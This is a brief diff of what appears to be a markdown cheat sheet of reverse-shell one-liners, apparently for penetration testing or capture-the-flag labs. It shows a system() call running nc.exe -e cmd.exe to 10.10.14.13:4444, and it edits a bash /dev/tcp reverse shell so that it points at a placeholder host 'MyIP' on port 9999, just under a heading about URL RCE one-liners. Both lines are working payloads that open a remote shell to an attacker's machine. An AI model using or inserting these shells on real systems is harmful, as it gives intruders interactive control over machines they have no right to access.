@@ -279,7 +279,7 @@ system('nc.exe -e cmd.exe 10.10.14.13 4444')
 #### BASH
 
 ```
-bash -i >& /dev/tcp//9999 0>&1
+bash -i >& /dev/tcp/MyIP/9999 0>&1
 
 Base One-liner for URL RCE + Encoded
 ---
